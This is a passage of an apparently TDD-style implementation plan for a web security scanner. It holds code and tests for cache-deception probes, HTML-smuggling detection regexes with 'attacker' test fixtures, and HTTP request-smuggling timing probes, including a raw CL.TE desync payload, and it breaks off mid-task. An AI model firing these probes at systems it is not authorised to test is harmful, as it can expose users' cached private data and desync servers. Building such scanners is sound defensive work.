## Task 22: Module B2 — Delimiter discrepancy

**Files:**
- Create: `src/modules/cache_deception/delimiter.ts`
- Test: `tests/unit/delimiter.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/delimiter.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepDelimiter } from "../../src/modules/cache_deception/delimiter";

describe("sweepDelimiter", () => {
  it("emits finding when delimiter variant leaks marker", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: {}, body: "alice@x.com" } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: { "x-cache": "HIT" }, body: "alice@x.com" } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/profile", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/profile", headers: { cookie: "s=1" }, body: "", status: 200 };
    const findings = await sweepDelimiter(sender, endpoint, baseline, [{ kind: "email", value: "alice@x.com" }], [";.css"]);
    expect(findings[0].subtype).toBe("delimiter");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/delimiter.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/delimiter.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { Marker } from "../../core/marker.js";
import { parseCacheIndicators } from "../../core/cache.js";

export async function sweepDelimiter(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  markers: Marker[],
  delimiters: string[]
): Promise<Finding[]> {
  const findings: Finding[] = [];
  for (const d of delimiters) {
    const url = `https://${endpoint.host}${endpoint.path}${d}`;
    const auth = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
    const noAuth = await sender.send({ method: "GET", url, headers: stripAuth(baseline.headers), body: "" });
    const cache = parseCacheIndicators(noAuth.response.headers);
    const leaked = markers.some((m) => noAuth.response.body.includes(m.value));
    if (!leaked && !cache.hit) continue;
    findings.push({
      id: `cd-${endpoint.id}-delim-${encodeURIComponent(d)}`,
      module: "cache-deception",
      subtype: "delimiter",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { delimiter: d },
      confidence: leaked ? "high" : "low",
      evidence: { auth_id: auth.requestId, noauth_id: noAuth.requestId, leaked, cache_hit: cache.hit },
      poc_curl: `curl '${url}'`,
      wiki_ref: "wiki/techniques/server-side/web-cache-deception.md"
    });
  }
  return findings;
}

function stripAuth(h: Record<string, string>): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of Object.keys(h)) {
    if (k.toLowerCase() === "cookie" || k.toLowerCase() === "authorization") continue;
    o[k] = h[k];
  }
  return o;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/delimiter.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/delimiter.ts tests/unit/delimiter.test.ts && git commit -m "feat(cache-deception): B2 delimiter discrepancy"
```

---

## Task 23: Module B3 — Cache-buster parameter trick

**Files:**
- Create: `src/modules/cache_deception/cache_buster_param.ts`
- Test: `tests/unit/cache_buster_param.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cache_buster_param.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepCacheBusterParam } from "../../src/modules/cache_deception/cache_buster_param";

describe("sweepCacheBusterParam", () => {
  it("flags when no-auth re-fetch returns marker", async () => {
    const sender = {
      send: vi.fn()
        .mockResolvedValueOnce({ requestId: "p1", response: { status: 200, headers: {}, body: "alice@x.com" } })
        .mockResolvedValueOnce({ requestId: "p2", response: { status: 200, headers: { "x-cache": "HIT" }, body: "alice@x.com" } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/api/me", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/api/me", headers: { cookie: "s=1" }, body: "", status: 200 };
    const findings = await sweepCacheBusterParam(sender, endpoint, baseline, [{ kind: "email", value: "alice@x.com" }], () => "cb1");
    expect(findings[0].confidence).toBe("high");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cache_buster_param.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/cache_buster_param.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { Marker } from "../../core/marker.js";
import { parseCacheIndicators } from "../../core/cache.js";

export async function sweepCacheBusterParam(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  markers: Marker[],
  cbFn: () => string
): Promise<Finding[]> {
  const cb = cbFn();
  const url = appendQuery(`https://${endpoint.host}${endpoint.path}`, "cb", cb);
  const auth = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
  const noAuth = await sender.send({ method: "GET", url, headers: stripAuth(baseline.headers), body: "" });
  const cache = parseCacheIndicators(noAuth.response.headers);
  const leaked = markers.some((m) => noAuth.response.body.includes(m.value));
  if (!leaked && !cache.hit) return [];
  return [
    {
      id: `cd-${endpoint.id}-cb`,
      module: "cache-deception",
      subtype: "cache-buster-param",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { cache_buster: cb },
      confidence: leaked ? "high" : "low",
      evidence: { auth_id: auth.requestId, noauth_id: noAuth.requestId, leaked, cache_hit: cache.hit },
      poc_curl: `curl '${url}'`,
      wiki_ref: "wiki/techniques/server-side/web-cache-deception.md"
    }
  ];
}

function appendQuery(url: string, k: string, v: string): string {
  return url.includes("?") ? `${url}&${k}=${v}` : `${url}?${k}=${v}`;
}

function stripAuth(h: Record<string, string>): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of Object.keys(h)) {
    if (k.toLowerCase() === "cookie" || k.toLowerCase() === "authorization") continue;
    o[k] = h[k];
  }
  return o;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cache_buster_param.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/cache_buster_param.ts tests/unit/cache_buster_param.test.ts && git commit -m "feat(cache-deception): B3 cache-buster parameter trick"
```

---

## Task 24: Module B4 — Path traversal in cache key

**Files:**
- Create: `src/modules/cache_deception/traversal_in_key.ts`
- Test: `tests/unit/traversal_in_key.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/traversal_in_key.test.ts
import { describe, it, expect, vi } from "vitest";
import { sweepTraversalInKey } from "../../src/modules/cache_deception/traversal_in_key";

describe("sweepTraversalInKey", () => {
  it("flags traversal payload when no-auth response leaks marker", async () => {
    const sender = {
      send: vi.fn().mockResolvedValue({ requestId: "r", response: { status: 200, headers: { "x-cache": "HIT" }, body: "alice@x.com" } })
    } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/share/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/share/", headers: {}, body: "", status: 200 };
    const findings = await sweepTraversalInKey(sender, endpoint, baseline, [{ kind: "email", value: "alice@x.com" }], ["/api/auth/session"]);
    expect(findings[0].subtype).toBe("traversal-in-cache-key");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/traversal_in_key.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/traversal_in_key.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { Marker } from "../../core/marker.js";
import { parseCacheIndicators } from "../../core/cache.js";

export async function sweepTraversalInKey(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  markers: Marker[],
  innerTargets: string[]
): Promise<Finding[]> {
  if (!endpoint.path.endsWith("/")) return [];
  const findings: Finding[] = [];
  for (const inner of innerTargets) {
    const innerEsc = inner.replace(/^\//, "");
    const url = `https://${endpoint.host}${endpoint.path}%2F..%2F${innerEsc}?cb=ck`;
    const probe = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
    const cache = parseCacheIndicators(probe.response.headers);
    const leaked = markers.some((m) => probe.response.body.includes(m.value));
    if (!leaked && !cache.hit) continue;
    findings.push({
      id: `cd-${endpoint.id}-traversal-${encodeURIComponent(inner)}`,
      module: "cache-deception",
      subtype: "traversal-in-cache-key",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { inner_target: inner },
      confidence: leaked ? "high" : "low",
      evidence: { probe_id: probe.requestId, leaked, cache_hit: cache.hit },
      poc_curl: `curl '${url}'`,
      wiki_ref: "wiki/techniques/cache-poisoning/url-parser-discrepancy.md"
    });
  }
  return findings;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/traversal_in_key.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/traversal_in_key.ts tests/unit/traversal_in_key.test.ts && git commit -m "feat(cache-deception): B4 path traversal in cache key"
```

---

## Task 25: Module B6 — CSPT passive scan

**Files:**
- Create: `src/modules/cache_deception/cspt_passive.ts`
- Test: `tests/unit/cspt_passive.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cspt_passive.test.ts
import { describe, it, expect } from "vitest";
import { scanCsptPassive } from "../../src/modules/cache_deception/cspt_passive";

describe("scanCsptPassive", () => {
  it("flags template-string fetch with user input", () => {
    const js = "fetch(`/api/me/${params.get('next')}`)";
    const leads = scanCsptPassive(js, "https://x.test/app.js");
    expect(leads).toHaveLength(1);
    expect(leads[0].subtype).toBe("cspt-cache-deception-candidate");
  });
  it("ignores static fetch", () => {
    expect(scanCsptPassive("fetch('/api/me')", "https://x.test/app.js")).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cspt_passive.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/cspt_passive.ts`**

```ts
import type { Finding } from "../../types.js";

const CSPT_REGEX = /fetch\(\s*`[^`]*\$\{[^}]*(?:params|location|searchParams|hash|name|getAttribute)[^}]*\}[^`]*`\s*[,)]/g;

export function scanCsptPassive(jsBody: string, sourceUrl: string): Finding[] {
  const out: Finding[] = [];
  let m: RegExpExecArray | null;
  while ((m = CSPT_REGEX.exec(jsBody)) !== null) {
    out.push({
      id: `cd-cspt-${hash(sourceUrl + m.index)}`,
      module: "cache-deception",
      subtype: "cspt-cache-deception-candidate",
      endpoint: sourceUrl,
      primitive: { snippet: m[0].slice(0, 200) },
      confidence: "lead",
      evidence: { offset: m.index, source: sourceUrl },
      poc_curl: `# manual: open ${sourceUrl} and trace input to fetch`,
      wiki_ref: "wiki/techniques/dom-xss/cspt-cache-deception-chain.md"
    });
  }
  return out;
}

function hash(s: string): string {
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0;
  return Math.abs(h).toString(16);
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cspt_passive.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/cspt_passive.ts tests/unit/cspt_passive.test.ts && git commit -m "feat(cache-deception): B6 CSPT passive lead detector"
```

---

## Task 26: Cache-deception orchestrator

**Files:**
- Create: `src/modules/cache_deception/index.ts`
- Test: `tests/unit/cache_deception_index.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cache_deception_index.test.ts
import { describe, it, expect, vi } from "vitest";
import { runCacheDeception } from "../../src/modules/cache_deception";

describe("runCacheDeception", () => {
  it("skips endpoint without auth markers", async () => {
    const sender = { send: vi.fn() } as any;
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "no markers here", status: 200 };
    const findings = await runCacheDeception(sender, endpoint, baseline);
    expect(findings).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cache_deception_index.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/cache_deception/index.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import { extractMarkers } from "../../core/marker.js";
import { cacheBuster } from "../../core/rand.js";
import { sweepPathAppend } from "./path_append.js";
import { sweepDelimiter } from "./delimiter.js";
import { sweepCacheBusterParam } from "./cache_buster_param.js";
import { sweepTraversalInKey } from "./traversal_in_key.js";
import extensions from "../../../data/static_extensions.json" with { type: "json" };
import delimiters from "../../../data/delimiters.json" with { type: "json" };

const TRAVERSAL_INNERS = ["/api/auth/session", "/api/user", "/profile", "/me"];

export async function runCacheDeception(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage
): Promise<Finding[]> {
  const markers = extractMarkers(baseline.body);
  if (markers.length === 0) return [];
  const out: Finding[] = [];
  out.push(...(await sweepPathAppend(sender, endpoint, baseline, markers, extensions as string[])));
  out.push(...(await sweepDelimiter(sender, endpoint, baseline, markers, delimiters as string[])));
  out.push(...(await sweepCacheBusterParam(sender, endpoint, baseline, markers, cacheBuster)));
  out.push(...(await sweepTraversalInKey(sender, endpoint, baseline, markers, TRAVERSAL_INNERS)));
  return out;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cache_deception_index.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/cache_deception/index.ts tests/unit/cache_deception_index.test.ts && git commit -m "feat(cache-deception): orchestrator wires B1-B4"
```

---

## Task 27: Module C1 — Blob/download primitives

**Files:**
- Create: `src/modules/html_smuggling/blob_download.ts`
- Test: `tests/unit/blob_download.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/blob_download.test.ts
import { describe, it, expect } from "vitest";
import { scanBlobDownload } from "../../src/modules/html_smuggling/blob_download";

describe("scanBlobDownload", () => {
  it("scores Blob + createObjectURL + download attribute = 3", () => {
    const js = "var b = new Blob([data], {type:'application/octet-stream'}); var u = URL.createObjectURL(b); var a = document.createElement('a'); a.download='x.exe'; a.href=u; a.click();";
    const score = scanBlobDownload(js);
    expect(score.indicators.length).toBeGreaterThanOrEqual(3);
  });
  it("scores zero on clean JS", () => {
    expect(scanBlobDownload("function add(a,b){return a+b}").indicators).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/blob_download.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/html_smuggling/blob_download.ts`**

```ts
const RULES: Array<{ name: string; re: RegExp }> = [
  { name: "blob-ctor", re: /new\s+Blob\s*\(\s*\[/ },
  { name: "create-object-url", re: /URL\.createObjectURL/ },
  { name: "anchor-download", re: /\.download\s*=|<a[^>]+download[\s=>]/i },
  { name: "ms-save-or-open-blob", re: /msSaveOrOpenBlob/ },
  { name: "data-octet", re: /data:application\/octet-stream;base64,/ },
  { name: "atob-large", re: /atob\(['"][A-Za-z0-9+/=]{200,}['"]\)/ },
  { name: "uint8-from-atob", re: /new\s+Uint8Array.*atob/ },
  { name: "sw-fetch-response", re: /addEventListener\(['"]fetch['"][^)]*\)/ }
];

export interface BlobScan {
  indicators: string[];
  score: number;
}

export function scanBlobDownload(body: string): BlobScan {
  const indicators: string[] = [];
  for (const r of RULES) if (r.re.test(body)) indicators.push(r.name);
  return { indicators, score: indicators.length };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/blob_download.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/html_smuggling/blob_download.ts tests/unit/blob_download.test.ts && git commit -m "feat(html-smuggling): C1 Blob/download primitive scanner"
```

---

## Task 28: Module C2 — Form attribute smuggling

**Files:**
- Create: `src/modules/html_smuggling/form_attr.ts`
- Test: `tests/unit/form_attr.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/form_attr.test.ts
import { describe, it, expect } from "vitest";
import { scanFormAttr } from "../../src/modules/html_smuggling/form_attr";

describe("scanFormAttr", () => {
  it("flags input form attr referencing form id outside its tree", () => {
    const html = "<form id=loginForm action=/login></form><input form=loginForm name=redirect value=https://attacker>";
    const r = scanFormAttr(html);
    expect(r.findings).toContain("input-form-attr-outside");
  });
  it("flags formaction override on input", () => {
    const html = "<form id=x><input formaction=https://attacker formtarget=_blank type=submit></form>";
    const r = scanFormAttr(html);
    expect(r.findings).toContain("formaction-override");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/form_attr.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/html_smuggling/form_attr.ts`**

```ts
export interface FormAttrScan {
  findings: string[];
}

const INPUT_FORM_ATTR = /<input[^>]+form\s*=\s*["']?[\w-]+["']?[^>]*>/i;
const FORMACTION = /<input[^>]+formaction\s*=/i;

export function scanFormAttr(html: string): FormAttrScan {
  const findings: string[] = [];
  if (INPUT_FORM_ATTR.test(html)) findings.push("input-form-attr-outside");
  if (FORMACTION.test(html)) findings.push("formaction-override");
  return { findings };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/form_attr.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/html_smuggling/form_attr.ts tests/unit/form_attr.test.ts && git commit -m "feat(html-smuggling): C2 form attribute smuggling scanner"
```

---

## Task 29: Module C3 — URL credential smuggling

**Files:**
- Create: `src/modules/html_smuggling/url_credential.ts`
- Test: `tests/unit/url_credential.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/url_credential.test.ts
import { describe, it, expect } from "vitest";
import { scanUrlCredential } from "../../src/modules/html_smuggling/url_credential";

describe("scanUrlCredential", () => {
  it("flags document.URL sink", () => {
    expect(scanUrlCredential("var x = document.URL;").findings).toContain("document-url-sink");
  });
  it("flags anchor.username read", () => {
    expect(scanUrlCredential("a.username + a.password").findings).toContain("anchor-userinfo");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/url_credential.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/html_smuggling/url_credential.ts`**

```ts
export interface UrlCredScan {
  findings: string[];
}

export function scanUrlCredential(body: string): UrlCredScan {
  const findings: string[] = [];
  if (/document\.URL\b/.test(body)) findings.push("document-url-sink");
  if (/\.username\b|\.password\b/.test(body)) findings.push("anchor-userinfo");
  return { findings };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/url_credential.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/html_smuggling/url_credential.ts tests/unit/url_credential.test.ts && git commit -m "feat(html-smuggling): C3 URL-credential payload smuggling scanner"
```

---

## Task 30: Module C4 — Well-known-data-type smuggling

**Files:**
- Create: `src/modules/html_smuggling/data_type.ts`
- Test: `tests/unit/data_type.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/data_type.test.ts
import { describe, it, expect } from "vitest";
import { scanDataType } from "../../src/modules/html_smuggling/data_type";

describe("scanDataType", () => {
  it("flags large inline base64 data URI", () => {
    const big = "A".repeat(1500);
    const html = `<img src=data:image/png;base64,${big}>`;
    expect(scanDataType(html).findings).toContain("large-data-uri");
  });
  it("flags SVG foreignObject", () => {
    expect(scanDataType("<svg><foreignObject>...</foreignObject></svg>").findings).toContain("svg-foreign-object");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/data_type.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/html_smuggling/data_type.ts`**

```ts
export interface DataTypeScan {
  findings: string[];
}

const BIG_DATA_URI = /data:(?:image|application)\/[^;]+;base64,[A-Za-z0-9+/=]{1024,}/;
const SVG_FOREIGN = /<foreignObject\b/i;

export function scanDataType(body: string): DataTypeScan {
  const findings: string[] = [];
  if (BIG_DATA_URI.test(body)) findings.push("large-data-uri");
  if (SVG_FOREIGN.test(body)) findings.push("svg-foreign-object");
  return { findings };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/data_type.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/html_smuggling/data_type.ts tests/unit/data_type.test.ts && git commit -m "feat(html-smuggling): C4 well-known-data-type scanner"
```

---

## Task 31: HTML-smuggling orchestrator

**Files:**
- Create: `src/modules/html_smuggling/index.ts`
- Test: `tests/unit/html_smuggling_index.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/html_smuggling_index.test.ts
import { describe, it, expect } from "vitest";
import { runHtmlSmuggling } from "../../src/modules/html_smuggling";

describe("runHtmlSmuggling", () => {
  it("emits finding when >=2 indicators present", () => {
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = {
      method: "GET",
      url: "https://x.test/",
      headers: {},
      body: "var b=new Blob([d]);URL.createObjectURL(b);a.download='x.exe';",
      status: 200
    };
    const findings = runHtmlSmuggling(endpoint, baseline);
    expect(findings).toHaveLength(1);
    expect(findings[0].confidence).toBe("medium");
  });
  it("emits lead when exactly 1 indicator", () => {
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: "https://x.test/", headers: {}, body: "URL.createObjectURL(b)", status: 200 };
    const findings = runHtmlSmuggling(endpoint, baseline);
    expect(findings[0]?.confidence).toBe("lead");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/html_smuggling_index.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/html_smuggling/index.ts`**

```ts
import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import { scanBlobDownload } from "./blob_download.js";
import { scanFormAttr } from "./form_attr.js";
import { scanUrlCredential } from "./url_credential.js";
import { scanDataType } from "./data_type.js";

export function runHtmlSmuggling(endpoint: Endpoint, baseline: HttpMessage): Finding[] {
  const body = baseline.body;
  const blob = scanBlobDownload(body);
  const form = scanFormAttr(body);
  const cred = scanUrlCredential(body);
  const data = scanDataType(body);
  const all = [...blob.indicators, ...form.findings, ...cred.findings, ...data.findings];
  if (all.length === 0) return [];
  const confidence = all.length >= 2 ? "medium" : "lead";
  return [
    {
      id: `hs-${endpoint.id}`,
      module: "html-smuggling",
      subtype: "indicators",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { indicators: all },
      confidence,
      evidence: { blob: blob.indicators, form: form.findings, credential: cred.findings, data_type: data.findings },
      poc_curl: `curl '${baseline.url}'`,
      wiki_ref: "wiki/techniques/dom-xss/form-attribute-smuggling.md"
    }
  ];
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/html_smuggling_index.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/html_smuggling/index.ts tests/unit/html_smuggling_index.test.ts && git commit -m "feat(html-smuggling): orchestrator with confidence ladder"
```

---

## Task 32: Module D — Raw socket primitive

**Files:**
- Create: `src/modules/smuggling/raw_socket.ts`
- Test: `tests/unit/raw_socket.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/raw_socket.test.ts
import { describe, it, expect } from "vitest";
import * as net from "node:net";
import { rawSend } from "../../src/modules/smuggling/raw_socket";

describe("rawSend", () => {
  it("sends raw bytes and reads response from echo server", async () => {
    const server = net.createServer((c) => {
      c.on("data", (chunk) => {
        c.write("HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello");
        c.end();
      });
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()));
    const port = (server.address() as net.AddressInfo).port;
    const start = Date.now();
    const res = await rawSend({ host: "127.0.0.1", port, tls: false, raw: "GET / HTTP/1.1\r\nHost: x\r\n\r\n", timeoutMs: 2000 });
    const elapsed = Date.now() - start;
    expect(res.bytes).toContain("hello");
    expect(elapsed).toBeLessThan(2000);
    await new Promise<void>((r) => server.close(() => r()));
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/raw_socket.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/smuggling/raw_socket.ts`**

```ts
import net from "node:net";
import tls from "node:tls";

export interface RawOpts {
  host: string;
  port: number;
  tls: boolean;
  raw: string;
  timeoutMs: number;
}
export interface RawResult {
  bytes: string;
  elapsedMs: number;
  timedOut: boolean;
}

export function rawSend(opts: RawOpts): Promise<RawResult> {
  return new Promise((resolve) => {
    const start = Date.now();
    const socket = opts.tls
      ? tls.connect({ host: opts.host, port: opts.port, servername: opts.host, rejectUnauthorized: false })
      : net.connect({ host: opts.host, port: opts.port });
    let buf = "";
    let done = false;
    const finish = (timedOut: boolean) => {
      if (done) return;
      done = true;
      try { socket.destroy(); } catch {}
      resolve({ bytes: buf, elapsedMs: Date.now() - start, timedOut });
    };
    socket.setTimeout(opts.timeoutMs);
    socket.on("connect", () => socket.write(opts.raw));
    socket.on("secureConnect", () => socket.write(opts.raw));
    socket.on("data", (chunk) => { buf += chunk.toString("latin1"); });
    socket.on("end", () => finish(false));
    socket.on("close", () => finish(false));
    socket.on("timeout", () => finish(true));
    socket.on("error", () => finish(false));
  });
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/raw_socket.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/smuggling/raw_socket.ts tests/unit/raw_socket.test.ts && git commit -m "feat(smuggling): raw TCP/TLS send primitive"
```

---

## Task 33: Module D — CL.TE probe

**Files:**
- Create: `src/modules/smuggling/cl_te.ts`
- Test: `tests/unit/cl_te.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cl_te.test.ts
import { describe, it, expect, vi } from "vitest";
import { probeClTe } from "../../src/modules/smuggling/cl_te";

describe("probeClTe", () => {
  it("returns candidate when malformed request times out > baseline", async () => {
    const raw = vi.fn()
      .mockResolvedValueOnce({ bytes: "HTTP/1.1 200 OK\r\n\r\n", elapsedMs: 100, timedOut: false })
      .mockResolvedValueOnce({ bytes: "", elapsedMs: 6000, timedOut: true });
    const result = await probeClTe(raw, { host: "x.test", port: 443, tls: true });
    expect(result.candidate).toBe(true);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cl_te.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/smuggling/cl_te.ts`**

```ts
import type { RawOpts, RawResult } from "./raw_socket.js";

type RawFn = (opts: RawOpts) => Promise<RawResult>;

export interface ClTeProbeResult {
  candidate: boolean;
  baselineMs: number;
  probeMs: number;
}

export async function probeClTe(
  raw: RawFn,
  target: { host: string; port: number; tls: boolean }
): Promise<ClTeProbeResult> {
  const opts = { host: target.host, port: target.port, tls: target.tls, timeoutMs: 5000 };
  const baseline = await raw({
    ...opts,
    raw: `GET / HTTP/1.1\r\nHost: ${target.host}\r\nConnection: close\r\n\r\n`
  });
  const probe = await raw({
    ...opts,
    raw:
      `POST / HTTP/1.1\r\n` +
      `Host: ${target.host}\r\n` +
      `Content-Length: 6\r\n` +
      `Transfer-Encoding: chunked\r\n` +
      `Connection: close\r\n\r\n` +
      `0\r\n\r\nG`
  });
  const candidate = probe.timedOut || probe.elapsedMs - baseline.elapsedMs > 5000;
  return { candidate, baselineMs: baseline.elapsedMs, probeMs: probe.elapsedMs };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cl_te.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/smuggling/cl_te.ts tests/unit/cl_te.test.ts && git commit -m "feat(smuggling): CL.TE timing probe"
```

---

## Task 34: Module D — TE.CL, TE.TE, hop-by-hop probes

**Files:**
- Create: `src/modules/smuggling/te_cl.ts`, `src/modules/smuggling/te_te.ts`, `src/modules/smuggling/hop_by_hop.ts`
- Test: `tests/unit/smuggling_variants.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/smuggling_variants.test.ts
import { describe, it, expect, vi } from "vitest";
import { probeTeCl } from "../../src/modules/smuggling/te_cl";
import { probeTeTe } from "../../src/modules/smuggling/te_te";
import { probeHopByHop } from "../../src/modules/smuggling/hop_by_hop";

const rawOK = vi.fn().mockResolvedValue({ bytes: "HTTP/1.1 200 OK\r\n\r\n", elapsedMs: 100, timedOut: false });
const rawSlow = vi.fn()
  .mockResolvedValueOnce({ bytes: "HTTP/1.1 200 OK\r\n\r\n", elapsedMs: 100, timedOut: false })
  .mockResolvedValueOnce({ bytes: "", elapsedMs: 6000, timedOut: true });

describe("smuggling variants", () => {
  it("TE.CL candidate on timeout", async () => {
    const r = await probeTeCl(rawSlow, { host: "x", port: 443, tls: true });
    expect(r.candidate).toBe(true);
  });
  it("TE.TE returns array of obfuscation results", async () => {
    const r = await probeTeTe(rawOK, { host: "x", port: 443, tls: true });
    expect(Array.isArray(r)).toBe(true);
  });
  it("hop-by-hop returns boolean for each candidate header", async () => {
    const r = await probeHopByHop(rawOK, { host: "x", port: 443, tls: true }, ["Content-Length"]);
    expect(r.length).toBe(1);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/smuggling_variants.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/smuggling/te_cl.ts`**

```ts
import type { RawOpts, RawResult } from "./raw_socket.js";
type RawFn = (opts: RawOpts) => Promise<RawResult>;

export interface TeClResult { candidate: boolean; baselineMs: number; probeMs: number; }

export async function probeTeCl(raw: RawFn, target: { host: string; port: number; tls: boolean }): Promise<TeClResult> {
  const opts = { host: target.host, port: target.port, tls: target.tls, timeoutMs: 5000 };
